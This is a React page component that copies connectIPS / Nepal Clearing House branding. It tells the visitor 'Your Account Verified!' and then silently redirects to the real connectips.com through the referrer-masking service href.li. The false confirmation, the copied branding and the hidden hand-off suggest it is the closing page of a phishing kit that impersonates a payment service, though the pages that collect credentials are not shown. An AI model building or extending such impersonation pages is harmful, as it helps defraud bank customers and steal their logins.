import { useEffect } from 'react';
import '../App.css';

function Welcome() {
  useEffect(() => {
    const timer = setTimeout(() => {
      window.location.href = 'https://href.li/?https://connectips.com/';
    }, 2000);

    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="login-page">
      <div className="login-container">
        {/* Logo Section */}
        <div className="login-logo">
          <img src="logo.png" alt="Logo" className="logo-image" />
        </div>

        {/* Verification Content */}
        <div className="text-center" style={{ padding: '2rem 0' }}>
          <div style={{ color: '#22c55e', marginBottom: '1rem' }}>
            <svg 
              style={{ 
                width: '4rem', 
                height: '4rem', 
                margin: '0 auto',
                animation: 'bounce 1s infinite'
              }}
              fill="none" 
              stroke="currentColor" 
              viewBox="0 0 24 24" 
              xmlns="http://www.w3.org/2000/svg"
            >
              <path 
                strokeLinecap="round" 
                strokeLinejoin="round" 
                strokeWidth="2" 
                d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"
              />
            </svg>
          </div>
          <h2 style={{ 
            fontSize: '1.5rem', 
            fontWeight: 'bold', 
            color: '#22c55e', 
            marginBottom: '1rem' 
          }}>
            Your Account Verified!
          </h2>
          <p style={{ 
            color: '#4b5563', 
            marginBottom: '1rem' 
          }}>
            Verification completed successfully.
          </p>
          <p style={{ 
            fontSize: '0.875rem', 
            color: '#6b7280' 
          }}>
            Redirecting to login page...
          </p>
          <div style={{ 
            width: '2rem',
            height: '2rem',
            margin: '0.5rem auto',
            border: '4px solid #3b82f6',
            borderTopColor: 'transparent',
            borderRadius: '50%',
            animation: 'spin 1s linear infinite'
          }}></div>
        </div>

        {/* Footer Section */}
        <footer>
          <img src="footer.png" alt="Powered by NPS" className="powered-by-logo" />
          <p>version: 1.11.5</p>
          <p>Copyright © Nepal Clearing House Limited, 2018-2024</p>
        </footer>
      </div>
    </div>
  );
}

export default Welcome;
